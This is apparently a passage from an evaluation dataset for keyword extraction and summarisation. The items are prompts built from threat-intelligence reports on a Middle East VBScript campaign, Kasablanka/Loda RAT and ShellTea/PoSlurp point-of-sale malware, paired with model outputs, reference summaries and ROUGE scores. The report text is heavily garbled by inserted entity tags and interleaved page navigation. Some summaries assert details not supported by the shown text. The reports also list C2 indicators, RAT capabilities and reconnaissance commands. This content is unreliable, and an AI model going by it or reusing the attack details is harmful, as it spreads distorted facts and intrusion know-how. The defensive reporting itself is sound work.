malicious code . The source code of [GPE] Jenxcus can be easily found on the Internet . However , the adaptation used in this campaign is more advanced : the features / functions are loaded on demand and the initial script does not include all the malicious code unlike [ORG] Jenxcus . Additional TargetsWe can identify different targets based on the [ORG] User - Agent used by the attacker to identify victims . These are a few examples : SoftwareBACK Email & Web Tra c [ORG] Reputation [ORG] Snort Communityc = \" U.15.7 \" [ORG] Microsoft [ORG] Advisories [ORG] AMP [ORG] Threat [ORG] Naming [ORG] Conventions ClamAV CommunityReputation CenterRazorback IP Blacklist Download Project AspisLibraryc = \" [CARDINAL] 1X.134 \" c = \" Fb-20.9 \" documents . During [DATE] 2017 , we identi ed several campaigns using the same decoy documents : MBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKVulnerability InformationThis document is a [DATE] weekly report about the major events occuring during [DATE] the [DATE] 1st [DATE] week [DATE] of [DATE] November [DATE] 2017 , talking about the most important events happening in [GPE] Jordan , [GPE] Iraq , [GPE] Syria , [GPE] Lebanon , [GPE] Palestine , [GPE] Israel , [GPE] Russia , [ORG] ISIS and the ongoing [LOC] Gulf [LOC] Countries con ict with [GPE] Qatar . Snort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityReputation CenterLibraryWe encountered this document in campaigns using .NET malware ( with the CC : foxlive[.]life ) and [NORP] C++ malware ( with the CC : download[.]share2 le[.]pro ) . The purpose of the malwares was to retrieve information relating to the targeted systems and to download an additional payload . Moreover , we identi ed another campaign using a share2 le[.]pro subdomain . Here is the decoy document in this campaign : [ORG] Daemonlogger [ORG] IP [ORG] Blacklist Download Project AspisMo owAboutCareersBlogPE - SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerThis document is a pension list of military personnel dated [DATE] June [DATE] 2017 , containing names of individuals which we have redacted , alongside a military rankindividuals which we have redacted , alongside a military rank . We do n't know if these campaigns are performed by the same actor or different groups interested in this region . These campaigns are still under investigation . SoftwareCONCLUSIONBACK Email & Web Tra c Reputation Snort CommunityThese campaigns show us that [CARDINAL] at [CARDINAL] least [CARDINAL] one threat actor is interested in and targeting [LOC] the [LOC] Middle [LOC] East . Due to the nature of the decoy documents , we can conclude that the intended targets have an interest in the geopolitical context of the region . The attackers used an analysis report alleged to be written by [GPE] Dar [GPE] El [GPE] - [GPE] Jaleel , a [NORP] Jordanian institute specialising in studies of the region . Some of these documents are tagged as con dential . [ORG] ClamAV [ORG] Microsoft Advisories AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project AspisReputation CenterLibraryDaemonlogger AWBO Exercises SpamCopSupport CommunitiesDuring the VBS Campaign , we were surprised by the level of OPSEC demonstrated by the attacker and their infrastructure . Legitimate service such as [ORG] CloudFlare were used to hide malicious activities . Additionally the attacker used user - agent   ltering and   rewall rules in order to grant access to speci c infected systems for [TIME] only [TIME] a [TIME] few [TIME] minutes in order to deliver shellcode . Following this , the server became unreachable . Another notable observation is the fact that the attacker was active only during [TIME] the [TIME] morning ( [NORP] Central [NORP] European timezone ) during our investigation . ImmunetMo owPE - SigAboutCareersTeslacrypt Decryption ToolThe usage of script languages is an interesting approach from the attackers ' point of view . These languages are natively available on Windows system , provide a high degree of   exibility , and can easily stay under the radar . [ORG] MBR [ORG] FilterBlogFIRSTCOVERAGELockyDumpAdditional ways our customers can detect and block this threat are listed below . FreeSentryROPMEMUSynful [PERSON] Knock [PERSON] ScannerCisco [PERSON] Smart Install ScannerFlokibot Tools Advanced Malware Protection ( [ORG] AMP ) is ideally suited to prevent the execution of the malware used by these threat actors . [ORG] CWS or [ORG] WSA web scanning prevents access to malicious websites and detects malware used in these attacks . Email Security can block malicious emails sent by threat actors as part of their campaign . [ORG] Network [ORG] Security appliances such as [ORG] NGFW , [ORG] NGIPS , and [PERSON] Meraki [PERSON] MX can detect malicious activity associated with this threat . File2pcapPyREBoxDeceptBASSMutiny FuzzerAMP [PERSON] Threat [PERSON] Grid helps identify malicious binaries and build protection into all [ORG] Cisco [ORG] Security products . [ORG] Umbrella , our secure internet gateway ( [ORG] SIG ) , blocks users from connecting to malicious domains , [ORG] IPs , and URLs , whether users are on or off the corporate network . Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [ORG] Snort.org . IOCS BACKVulnerability InformationVBS Campaign : Domain # 1 : o ce - update[.]services IP # 2 : [CARDINAL] 176[.]107[.]185[.]246ClamAV [ORG] Microsoft Advisories AMP Threat Naming Conventions Email & Web Tra c Reputation Snort CommunityReputation CenterRazorback IP Blacklist Download Project AspisLibrarySupport CommunitiesDaemonlogger AWBO Exercises SpamCop . NET Campaign : Domain # 1 : jo[.]foxlove[.]life Domain # 2 : eg[.]foxlove[.]life Domain # 3 : [ORG] fox[.]foxlove[.]lifeImmunetMo owPE - SigAboutCareersCampaign # 3 : Domain : download[.]share2 le[.]proMBR FilterFIRSTBlogTeslacrypt Decryption ToolLockyDumpCampaign # 4 : Domain : update[.]share2 le[.]proFlokibot ToolsFreeSentrySynful [PERSON] Knock ScannerP O S T E D B Y P A [ORG] U [ORG] L [ORG] R A S C A G N E R E S AT 1 2 : 4 8 A M L A B E L S : A P T , M A LW A R E , M A LW A R E A N A LY S I S , M I D D L E E A S T , O P S E C , V B S C R I P TCisco Smart Install ScannerS H A R E T H I S P O S TROPMEMUBASSNO COMMENTS : [PERSON] PyREBoxFile2pcapDeceptPOST A [ORG] COMMENTMutiny [PRODUCT] FuzzerComment as : SoftwarePublish BACKVulnerability InformationReputation CenterSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download Project Aspis H O M EO L D E R P O S TLibraryS [ORG] U [ORG] B [ORG] S [ORG] C R I B E T O : P O S T C O M M E N T S ( AT O M ) Daemonlogger AWBO Exercises SpamCopSupport [ORG] CommunitiesSearch [ORG] BlogAboutS [ORG] U [ORG] B [ORG] S [ORG] C [ORG] R I B E T O O U R F E E DMo owPE - SigImmunetCareersPostsBlogCommentsSubscribe via EmailB [ORG] L [ORG] O [ORG] G A R C H I V E \u25bc [CARDINAL] 2 0 1 8 ( 21 ) \u25bc F E B R U A R Y ( 3)Teslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerTargeted Attacks In [ORG] The [ORG] Middle [ORG] East [ORG] Beers with [ORG] Talos [ORG] EP 22 : Forget the [ORG] ASA , [PERSON] Rob [PERSON] Joyce Flash 0 [DATE] - Day In The Wild : Group [CARDINAL] 123 At The [PERSON] Controls Cisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny Fuzzer \u25ba J A N U A R Y ( [CARDINAL] 18 ) \u25ba 2 0 1 7 ( [CARDINAL] 172 ) \u25ba 2 0 1 6 ( [CARDINAL] 98 ) \u25ba 2 0 1 5 ( [CARDINAL] 62 ) \u25ba 2 0 1 4 ( [CARDINAL] 67 ) \u25ba 2 0 1 3 ( [CARDINAL] 30 ) \u25ba 2 0 1 2 ( 53 ) \u25ba 2 0 1 1 ( [CARDINAL] 23 ) \u25ba 2 0 1 0 ( [CARDINAL] 93 ) \u25ba 2 0 0 9 ( [CARDINAL] 146 ) \u25ba 2 0 0 8 ( 37)R E C O M M E N D E D B L O G SR E C O M M E N D E D B L O G SC I S C O B L O G It \u2019s Not a Network Problem , and [WORK_OF_ART] I [WORK_OF_ART] Can [WORK_OF_ART] Prove [WORK_OF_ART] ItC [WORK_OF_ART] L [WORK_OF_ART] A [WORK_OF_ART] M [WORK_OF_ART] A [WORK_OF_ART] V [WORK_OF_ART] \u00ae [WORK_OF_ART] B [WORK_OF_ART] L [WORK_OF_ART] O G ClamAV [CARDINAL] 0.100.0 beta has been released!SoftwareS N O R T B L O G Snort Subscriber Rule Set Update for [CARDINAL] 01/16/2018Vulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogBACK Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE - SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKVulnerability [ORG] InformationReputation [ORG] CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE - SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSoftwareReputation CenterVulnerability InformationBACK Email & Web Tra c [ORG] Reputation [ORG] Snort [ORG] CommunityMicrosoft [ORG] Advisory Snort RulesClamAV [ORG] AMP [ORG] Threat [ORG] Naming [ORG] Conventions IP Blacklist DownloadAWBO Exercises IP Blacklist Download SpamCopCareersBlogMo owPE - Sig CONNECT WITH [ORG] US [ORG] ImmunetTeslacrypt [ORG] Decryption ToolMBR FilterFIRST \u00a9 [DATE] 2018 [ORG] Cisco [ORG] Systems , Inc. and/or its affiliates . All rights reserved . View our Privacy Policy here . LockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny Fuzzer", "generated_text": "The document; research; the Jordanian publishing and research house; Dar El-Jaleel; the attacker; VBScript; PowerShell; VBA; connections; Synful Knock Scanner; Microsoft; SPyREBox; Mutiny Fuzzer; the conflict; the Middle East; the command; control; infrastructure; the region; the use; the Middle East; a targeted attack; the Middle East; the Shellcode; Iranian; Middle Eastern; IP; Malware; the region.", "ref_text": "<START-1>The document describes a targeted attack campaign affecting the Middle East that uses VBScript, PowerShell, and VBA macros to deploy malware. The campaign starts with a VBScript that generates a PowerShell script. The PowerShell script creates a weaponized Office document containing macros. When opened, the macro creates and executes a Windows Script File (WSF). The WSF file contains the main malware functionality, configured to contact a command and control server, oce-update[.]services. It registers the infected system and retrieves additional payloads, which are obfuscated VBScript functions. The payloads include reconnaissance functions to fingerprint the infected system, persistence functions, and a pivot function to download and execute shellcode from another IP address. The attacker exhibits strong operational security, using CloudFlare to hide infrastructure, filtering on user agents, and only enabling C2 servers briefly. Code analysis shows similarities to the Jenxcus/Houdini malware. Decoy documents pretend to be confidential reports from a Jordanian research institute on regional conflicts. This and other clues suggest the campaign targets individuals with interest in Middle East politics and military affairs. Talos provides IOCs, detection coverage, and recommendations like updating software, blocking scripts, using email security, and building threat intelligence. In summary, the report analyzes an advanced, targeted VBScript malware campaign affecting the Middle East region. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.42857142857142855, "gpt3/lexical/rouge_rouge2": 0.13812154696132597, "gpt3/lexical/rouge_rougeL": 0.21978021978021978, "gpt3/lexical/rouge_rougeLsum": 0.21978021978021978, "gpt3_generated_text": ["This article discusses a targeted attack in the Middle East, specifically targeting the Jordanian publishing and research house, Dar El-Jaleel. The attacker used scripting languages such as VBScript, PowerShell, and VBA to execute their attack. The attacker demonstrated excellent operational security and camouflaged their infrastructure using the CloudFlare system. They also filtered connections based on User-Agent strings and only enabled their infrastructure for short periods of time. This is not the first targeted campaign against the region using Dar El-Jaleel decoy documents. The campaign involves multiple stages, including the use of PowerShell scripts and Microsoft Office documents with macros. The purpose of the macros is to create a Windows Script File. The attacker's infrastructure is constantly evolving and includes various tools such as Synful Knock Scanner, SPyREBox, and Mutiny Fuzzer. This targeted attack highlights the ongoing conflict in the Middle East and the use of sophisticated techniques by the attacker."]}, {"split_name": "val", "sample_id": "val_30", "prompt_text": "Extract the keywords: ti.qianxin.com /blog / articles / [ORG] Kasablanka - [ORG] Group - [ORG] Probably - [ORG] Conducted - [ORG] Compaigns - [ORG] Targeting - Russia/ [ORG] Kasablanka [ORG] Group [ORG] Probably [ORG] Conducted [ORG] Compaigns [ORG] Targeting [ORG] RussiaOverviewAPT groups often use some uncommon file types to host malicious code in order to increase the probability of immunity against antivirus software , such as CD - ROM image files ( .iso ) and virtual hard disk files ( .vhd ) , which we have monitored for abuse in [DATE] recent [DATE] years . And the use of these [CARDINAL] two formats can effectively circumvent the [ORG] MOTW mechanism ( a security measure in which Windows displays a warning message when a user tries to open a file downloaded from the Internet ) . The effectiveness of the [ORG] Lazarus group 's attack campaign was evident back in [DATE] November ' 22 when we disclosed that its attack components using the vhdx format had a detection rate of [CARDINAL] 0 on [ORG] VirusTotal . When combing through the recently uploaded vhdx files we found that from [DATE] September [DATE] to [DATE] December [DATE] 2022 , [ORG] Kasablanka group is suspected of attacking [GPE] Russia , and its targets include [ORG] the [ORG] Russian [ORG] Federal [ORG] Government [ORG] Cooperation [ORG] Agency , [ORG] the [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Communications [ORG] of [ORG] the [ORG] Astrakhan [ORG] Region [ORG] of [ORG] Russia , etc . , and the detection rate of some samples is always [CARDINAL] 0.Analyzing and organizing the captured samples , the [ORG] Kasablanka group used a socially engineered phishing email as the entry point for the attack , with a virtual disk image file attached , which nested a variety of next - stage payload executions including lnk files , zip packages , and executables . In the early stages of the attack the final execution was the commercial [ORG] Trojan [ORG] Warzone [ORG] RAT , in the later stages of the attack we observed that the executed [GPE] Trojan changed to [PERSON] Loda [PERSON] RAT.1/21Decoy [PERSON] FileA phishing attack against the Agency of the Government of [GPE] the [GPE] Russian [GPE] Federation for CIS Affairs , [GPE] Aliens and International Humanitarian Cooperation , or \" \u0420\u043e\u0441\u0441\u043e\u0442\u0440\u0443\u0434\u043d\u0438\u0447\u0435\u0441\u0442\u0432\u043e\" . The translation of the phishing email content is as follows\uff1a2/21Phishing email attack against [ORG] the [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Communications [ORG] of [ORG] the [ORG] Astrakhan [ORG] Region [ORG] of [ORG] Russia . The translation of the phishing email is as follows:3/21One of the phishing email attachments uses the situation related to [GPE] the [GPE] Republic [GPE] of [GPE] Turkey in [DATE] 2022 as a bait . Attacks using articles related to [NORP] Russian import substitution and migration policy in [DATE] 2015 as bait.4/21In addition , the [PERSON] Kasablanka group intercepted the [ORDINAL] first page from [LAW] Resolution No . [LAW] 1725 published on the official website of the Government of [GPE] the [GPE] Russian [GPE] Federation as a decoy.5/21And the relevant content of the draft [LAW] Digital [LAW] Code of [GPE] Kyrgyzstan was used as a bait.6/21Sample [PRODUCT] AnalysisThe captured samples are all virtual disk image files ( .vhdx suffix ) , and the sample decoy names and contents are in [NORP] Russian and uploaded from [NORP] Russian regions . Some of the samples use lnk files as [PERSON] Loda RAT been sold publicly on the internet as a software subscription since [DATE] 2018 and is compatible with systems below Windows 10 , with remote desktop , password stealing , keylogging , remote commands , permission elevation , download execution and many other remote control functions . It has been used by several [ORG] APT groups , including Confucius , Bitter , [ORG] Blind [ORG] Eagle ( [ORG] APT - Q-98 ) and other groups .9/21This captured Warzone [ORG] RAT eventually establishes a [ORG] TCP connection to the server 0x28Obtain information about the controlled machine Get process list information Get drive information Get directory information Retrieving files from the victim device 's folder [ORG] Delete the specified file Ends the specified process Remote shell Ends the specified thread List the victim 's camera device information Turn on the camera Stop the camera Get the title of the active program [PERSON] Exit and delete your own files Downloading files to the controlled end Get browser password [PERSON] Download the file from the given URL to the controlled end and execute it Install HRDP Manager on the victim 's device11/21Function [CARDINAL] 0x4CLoda RATFunctionEnable reverse proxy Stop reverse proxy [ORG] Start remote [ORG] VNC [ORG] Shutting down remote [PRODUCT] VNC [PRODUCT] Reverse proxy port settings [ORG] Execute or open the specified file Injection into the specified process Traversing to get file information Multiple post - command breakdowns , including shutdown , network test , exit , etcLoda [ORG] RAT is a proprietary malware written in AutoIt script language , [ORDINAL] first captured and disclosed in the wild by [GPE] Proofpoint in [DATE] September [DATE] 2016 , the name ' [PERSON] Loda ' derives from the malware author 's choice of directory to write keylogger logs to as [PERSON] Loda . Subsequently [GPE] Cisco discovered multiple variants of [PERSON] Loda RAT and found that the [ORG] RAT added spying capabilities to the [ORG] Android platform . After a series of investigations , [GPE] Cisco concluded that the group using the malware was based in [GPE] Morocco and named the group [PRODUCT] Kasablanka ( the largest city in [GPE] Morocco ) [ 1].Analysis of the captured sample showed that it was written in C # and obfuscated so extensively that common tools could not decompile it , and added a large amount of [CARDINAL] 00 data at the end of the [ORG] PE file , swelling the entire file size to [CARDINAL] 741MB.12/21After execution , the sample first releases and executes the [PERSON] Loda RAT packaged with AutoIt in the % appdata% directory , and the AutoIt script can be restored by using the deep analysis function of [PERSON] QiAnXin 's [ORG] Threat [ORG] Intelligence [ORG] Center [ORG] Cloud [ORG] Sandbox , and the behavior and functions of the trojan can be seen by analyzing the script . [PERSON] Loda [PERSON] RAT [ORDINAL] first detect antivirus products installed on victim machines through [ORG] WMI commands.13/21Followed operation is collecting some information of victim host , including permissions , operating system version , etc.14/21And adding persistentence by creating % appdata%\\Windata\\svshost.exe and NFOKQN.lnk shortcut to svshost.exe in windows startup directory . Uploading the collected information and then takeing screenshots.15/21Subsequently enter the remote control loop , by processing the data returned by [CARDINAL] C2 , and then correspond to the detailed remote control instructions , and its remote control instructions divided into a relatively fine function , rough statistics have [CARDINAL] 144 remote control instructions , due to the reasons of space , we will not do a detailed introduction , a general overview of its remote control functions . [PERSON] Recording [PERSON] Upload and download files Execute the specified file [PRODUCT] Shutdown [PRODUCT] Close the specified process Stealing user cookies , passwords Turn on keylogger [ORG] Delete keylogger data [PERSON] Download and execute the file from the specified URL Get file or directory size Allow RDP connections by modifying the registry [PERSON] Compressing / uncompressing files [PERSON] Copy files or directories [PERSON] Enumerate connected drives Enumerate hot folder locations [ORG] Detect [ORG] UAC settings [PERSON] Send [PERSON] mouse clicks ( to the left or right is a separate command \uff09 Capture screenshots and send to C2 Open / close CD trays [PERSON] Recording [PERSON] Turn off Windows Firewall Send the name of running processes to C2 Exit , uninstall Create a [ORG] GUI chat window to save the victim / attacker conversation to a file16/21In addition , in the previous version , LodaRAT downloaded [PERSON] SQLite3.dll from the official AutoIt website because it was needed to extract sensitive information from the browser database , but the embedded URL had been unavailable for download . So in the latest version , the [ORG] Kasablanka group transcoded it function is to download WinScp tools to synchronize files with remote computers and set scheduled tasks follow - up payload to execute , and the payload is Warzone RAT or [ORG] CS Trojan.18/21Some security vendors believe that [PERSON] Loda RAT is the exclusive trojan of [ORG] Kasablanka group , but since [PERSON] Loda RAT is compiled from AutoIt scripts and its source code can be obtained by decompiling it , ' false flag ' activities by other threat actors using the decompiled source code are also possible . In terms of attack motivation , we believe that the purpose of this attack is mainly for information gathering and espionage . Considering the current situation between [GPE] Russia and [GPE] Ukraine , intelligence spying and espionage are more in line with the motivation of nation - sponsered hacker groups , so we attribute this attack to [ORG] Kasablanka group with moderate confidence . SummaryIn previous disclosures of the [PERSON] Kasablanka group 's operations , its targets included [GPE] Bangladesh , [LOC] South [LOC] America and [GPE] the [GPE] United [GPE] States , and its [PERSON] Loda RAT includes Windows version and [ORG] Android version . Now this group often uses commercial RATs in its attack activities , which not only reduces the development cost but also makes it difficult for tracing attackers \u2019 footprints . The [ORG] RedDrip team would like to remind all users not to open links of unknown origin shared by social media , not to click on email attachments from unknown sources , not to run unknown files with exaggerated titles , not to install APPs from informal sources , to back up important files in a timely manner , and to update and install patches . If you need to run or install an application of unknown origin , you can [ORDINAL] first identify it through [ORG] the [ORG] QiAnXin [ORG] Threat [ORG] Intelligence [ORG] File [ORG] Deep [ORG] Analysis [ORG] Platform ( url At present , it supports deep analysis of files in various formats including [PRODUCT] Windows and [ORG] Android platforms . Currently , a full line of products based on the threat intelligence data from [ORG] the [ORG] QiAnXin [ORG] Threat [ORG] Intelligence [ORG] Center , including [ORG] the [ORG] QiAnXin [ORG] Threat [ORG] Intelligence [ORG] Platform ( TIP ) , [ORG] SkyRock , QiAnXin [ORG] Advanced [ORG] Threat [ORG] Detection [ORG] System , QiAnXin [ORG] NGSOC , [ORG] QiAnXin [ORG] Situational [ORG] Awareness , etc . , already support the accurate Reference Links[1 ] url url", "generated_text": "a security measure; malware; Kasablanka Group; targets; the Russian Federal Government Cooperation Agency; the Ministry of Foreign Communications; the Astrakhan Region; Russia; malware; decoys; lnk files; zip packages; execution; the Trojan; Loda RAT; the group; a phishing email; details; detection; 0; a phishing email; detection; samples; a command; control; data; the malware; mobile malware; tactics; detection; detection; detection; a threat actor; the use; the MOTW; detection; advanced detection; a threat actor; the MOTW mechanism; SMB; protection; a framework; tools; detection; adware; JSON; a reconnaissance; the threat actor; attacks; a group.", "ref_text": "<START-1>The cybersecurity company QiAnXin discovered that the hacking group Kasablanka conducted campaigns targeting organizations in Russia between September and December 2022. The group sent phishing emails with .vhdx virtual hard disk files attached that contained malicious payloads. The emails posed as communications related to the Russian government and current events to encourage targets to open them. The virtual disk files contained lnk files, zip files, and executables that installed remote access Trojans like Warzone RAT and Loda RAT on target systems. Loda RAT was packed in an obfuscated executable over 700MB large. It could stealthily capture screenshots, keylogs, files, and other data. Warzone RAT connected to a command and control server to allow the attackers full remote control. Earlier versions embedded the RATs directly in the Word documents. Later versions hid them in image files downloaded by the initial scripts. The PowerShell code used string obfuscation techniques to avoid detection. QiAnXin believes the attackers aim to gather intelligence and conduct espionage. While Loda RAT was previously tied to Kasablanka, other groups could be copying its code. The targeting of Russian organizations and use of the Russian language/current events suggests a nation-state actor likely conducted this campaign. QiAnXin recommends updating software and not opening suspicious emails or files. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4413793103448276, "gpt3/lexical/rouge_rouge2": 0.10623556581986143, "gpt3/lexical/rouge_rougeL": 0.20229885057471264, "gpt3/lexical/rouge_rougeLsum": 0.20229885057471264, "gpt3_generated_text": ["The article discusses the activities of the Kasablanka Group, a threat actor believed to be targeting Russia. The group utilizes uncommon file types, such as CD-ROM image files and virtual hard disk files, to host malicious code, increasing their immunity against antivirus software. The Lazarus group's attack campaign using the vhdx format had a detection rate of 0 on VirusTotal. The Kasablanka Group's attack tactics involve socially engineered phishing emails with attachments containing various payloads, including lnk files, zip packages, and executables. The final execution of the attack changes from the commercial Trojan Warzone RAT to the Loda RAT. The article provides details of specific phishing email attacks against the Russian Federal Government Cooperation Agency and the Ministry of Foreign Communications of the Astrakhan Region of Russia. The Kasablanka Group also uses decoys, such as intercepted pages from official Russian government websites, to lure victims. The captured samples of the malware are virtual disk image files with decoy names and contents in Russian. The article also mentions the use of the Loda RAT and its functionalities, such as remote control functions and browser password retrieval. The Kasablanka Group is considered an advanced threat actor, utilizing the MOTW mechanism to bypass security measures. The article emphasizes the importance of advanced detection and protection tools in detecting and mitigating the threat posed by such groups."]}, {"split_name": "val", "sample_id": "val_31", "prompt_text": "Extract the keywords: SHELLTEA + POSLURP [PERSON] MALWARE MEMORY - RESIDENT POINT - OF - SALE MALWARE ATTACKS INDUSTRYROOT9B [DATE] JUNE [DATE] 2017TABLE OF CONTENTSMEMORY - RESIDENT POINT - OF - SALE MALWAREATTACK OVERVIEWSHELLTEA MEMORY RESIDENT MALWARE ( C2)MALWARE ANALYSIS : PoSLURP MALWAREMITIGATION RECOMMENDATIONSINDICATORS OF COMPROMISE ( IOCs)TOOLS349172223232MEMORY - RESIDENT POINT - OF - SALE MALWARERetail Point - of - Sale ( PoS ) systems remain a top target for the financially - motivated hacker . Theft of payment card data in large volume exists not only as its own segment within financial crime , but also serves to facilitate other even more harmful motives of [DATE] today \u2019s criminal elements . To the businesses targeted by cyber criminals , the negative effects are far reaching with impact on brand reputation , consumer and investor confidence , and business growth strategies . With such a lucrative target as payment card data , adversary groups continue to adapt [ORG] Tactics , Techniques , and [PERSON] Procedures ( TTPs ) in response to defenders \u2019 change in security practices . [CARDINAL] One effective attacker [ORG] TTP is to use so - called \u201c fileless , \u201d or memory - resident malware , to carry out attacks against retailer PoS systems.root9B discovered an advanced , targeted PoS intrusion focused on harvesting payment card information for exfiltration . The adversary \u2019s campaign has active and operational [ORG] Command and Control ( C2 ) servers . root9B \u2019s analysis determined that the adversary is using advanced memory - resident techniques to maintain persistence and avoid detection . The malware likely required a significant amount of time and knowledge to create . We typically see techniques at this level by well - resourced , well - funded , motivated adversaries . This ongoing campaign has targeted numerous organizations and their PoS systems . root9B uncovered the TTPs utilized and describes them in a detailed analysis below . At a high - level , the adversary \u2019s methodology consists of the following steps:\u2022 Step [CARDINAL] 1 : Reconnaissance and targeting of a corporate individual with a spearphishing email attackemploying an ActiveMIME document with an [ORG] MS [ORG] Office - enabled macro.\u2022 Step [CARDINAL] 2 : Email recipient opens the ActiveMIME document attachment and clicks to enable content , executing a [ORG] PowerShell command initiating a surreptitious shellcode download.\u2022 Step [CARDINAL] 3 : A shellcode blob encapsulating a Dynamic Link Library ( [ORG] DLL ) malware is dropped in the system registry and loaded into memory , conducting basic enumeration and sandbox detection on the target . This malware appears to be an updated version of \u201c PowerSniff . \u201d\u2022 Step [CARDINAL] 4 : The malware continues reconnaissance of the target environment and contacts one of its [CARDINAL] five [CARDINAL] C2 domains with the results . If the environment meets the conditions the attacker is looking for , the attacker sends additional instructions.\u2022 Step [CARDINAL] 5 : The attackers install a [ORDINAL] second fileless implant in another registry shellcode blob . This implant , which we have named [ORG] ShellTea , has not been previously observed or reported . We have identified [CARDINAL] six hardcoded C2 domains utilized by this implant.\u2022 Step [CARDINAL] 6 : The attacker explores the network using compromised privileged credentials and establishes persistent staging servers for deploying malware and collecting data from PoS endpoints . Several staging servers are utilized by the attackers to spread the workload and provide redundancy to thwart defensive [PRODUCT] measures.3\u2022 [PRODUCT] Step [CARDINAL] 7 : An advanced PoS [ORG] RAM scraping malware , we have named [PERSON] PoSlurp , is deployed to the PoS endpoints . PoSlurp directly injects memory - resident code into a privileged user mode process . This capability has not been previously reported . The attacker can specify which PoS processes should be monitored for payment card transactions.root9B has been able to deconstruct the [CARDINAL] four major components of the adversary \u2019s activities . Provided here is a detailed analysis of the initial access method , command - and - control methods , and the new [ORG] ShellTea implant and PoSlurp POS RAM Scraper . ATTACK OVERVIEWINITIAL [DATE] ACCESSInitial execution of the attack begins with a customized email to a targeted entity with a malicious macro- enabled [ORG] ActiveMime [ORG] Office document attached . Once the targeted victim opens the attached document and clicks to enable macros , the macro quietly launches a [ORG] PowerShell command that will download another [ORG] PowerShell stage from a staging site ( often public paste sites ) into memory and execute it . Seen in the command line below is the command ( iex ) to execute the downloaded payload in memory , after determining if a 32 - bit or [CARDINAL] 64 - bit payload is required ( [ IntPtr]::size -eq 4 ) . This technique maintains a fileless footprint on the target.4POWERSNIFF DROPPERThe previous [ORG] PowerShell script will in turn load and execute a 32 - bit or [QUANTITY] 64 - bit binary shellcode blob in memory . The returned shellcode blob includes code to then de - obfuscate and load a [ORG] DLL into memory . It also includes a function hash resolution routine to find API calls it needs that were likely copied from the [PRODUCT] Carberp source code . [PERSON] Carberp was a common piece of malware that served as a full - featured backdoor , often incorporating additional payloads with the following features:\u2022 [ORG] Steal browser credentials to banking and other websites\u2022 Steal credentials from other applications\u2022 Monitor users \u2019 keystrokes and screensThis malware does not have any of those capabilities , as it only incorporated the function hashing code from [ORG] Carberp . The source code to the [PERSON] Carberp banking trojan was leaked [DATE] a [DATE] few [DATE] years [DATE] ago and is presumably used by several actors now . Once loaded , the inner [ORG] DLL includes routines to inject itself into the memory of explorer.exe . The malicious [ORG] Office macro and [ORDINAL] second - stage payload , downloaded and executed in - memory , matches previous analysis of \" PowerSniff1 \" by the following characteristics:\u2022 Use of [ORG] WMI in the macro to launch the initial [ORG] PowerShell command\u2022 [ORG] PowerShell command 's method of detecting CPU architecture(by the size of [ORG] IntPtr , [CARDINAL] 8 bytes for [CARDINAL] 64 - bit and [CARDINAL] 4 bytes for 32 - bit)\u2022 [PERCENT] URL [PERCENT] pattern\u2022 [PERCENT] Sandbox detection methods\u2022 Basic enumeration command strings in memory , like : cmd /C \" net.exe view > % s\"cmd \t /C \t \" ipconfig \t -all \t > \t % s\"After being loaded and de - obfuscating itself in memory , the logic of this threat bears a strong resemblance to what researchers have called TROJ_RECOLOAD.A , sharing those characteristics as well as the injection into explorer.exe . Through preliminary analysis , we believe that TROJ_RECOLOAD.A2 could also be a variant of Powersniff . Although , in that analysis , they observed it being launched from an exploit kit.1url [DATE] 2url did detect several differences in the variant we saw . [ORDINAL] First , the sandbox detection has been overhauled : Sandbox detection in the new [ORG] PowerSniff variantOur sample , despite retaining the sandbox [ORG] DLL strings in memory , no longer references most of them in code as it only looks for [CARDINAL] two . It maintains the same username checks , and our sample has added instructions for detecting sandboxes via several new methods:\u2022 Computing a checksum of the hard disk volume name and checking against a known checksum.\u2022 Looking for strings indicative of virtual machines in the system firmware information.\u2022 Hashing the names of running processes and comparing each against a list of the name hashes ofknown analysis , monitoring , or reverse engineering software.6Interestingly , in this function , it appears the malware developers made a mistake . There are only 25 CRC32s to check against in the array , but the loop comparing the process name CRC32 to the list of hashes runs [CARDINAL] 100 times , reading off the end of the array and into other data . Most likely this is a result of the malware developers writing a loop in C / C++ as : for(int \t i \t = \t 0 ; \t i \t < \t sizeof(hashes ) ; \t i++ ) { hashes[i ] instead of : for(int \t i \t = \t 0 ; \t i \t < \t sizeof(hashes ) \t / \t sizeof(DWORD ) ; \t i++ ) { hashes[i ] running the loop once for each byte in the hash array instead of once for each hash ( each hash takes 4 bytes ) . 